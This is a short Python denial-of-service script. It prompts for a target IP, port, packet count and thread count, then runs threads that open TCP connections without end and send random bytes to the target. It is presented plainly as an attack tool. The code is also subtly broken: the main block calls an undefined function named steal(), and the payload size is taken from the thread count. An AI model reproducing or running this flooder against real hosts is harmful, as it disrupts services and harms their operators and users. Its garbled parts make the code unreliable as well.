import random, socket, threading, os
ip = str(input('[/] Enter IP : '))
port = int(input('[/] Enter Port : '))
times = int(input('[/] Enter Packet : '))
threads = int(input('[/] Enter Thread : '))

def run():
    data = random._urandom(threads)
    i = random.choice(('[*]', '[!]', '[#]'))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            else:
                print(i + ' Send Packet to {} at Port {}'.format(ip, port))

        except socket.error:
            s.close()
            print('[*] Error Connection Maybe Server Down')


if __name__ == '__main__':
    steal()
    for y in range(threads):
        th = threading.Thread(target=run)
        th.start()